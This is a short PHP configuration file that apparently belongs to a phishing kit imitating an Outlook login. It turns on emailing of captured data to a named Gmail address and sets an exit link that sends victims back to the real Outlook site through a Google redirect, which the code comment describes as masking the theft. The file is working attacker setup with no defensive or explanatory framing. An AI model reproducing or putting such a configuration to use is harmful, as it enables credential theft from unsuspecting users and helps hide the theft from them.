<?php
$saveFile = 0;
$sendEmail = 1;



$to = 'londonman231@gmail.com';
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjR5euf2MvjAhUB66QKHQYdCAgQFjAAegQIABAB&url=https%3A%2F%2Foutlook.live.com%2F&usg=AOvVaw0ehqvNiTCQke_GULULE7bE"; // Real site via google redirect

?>
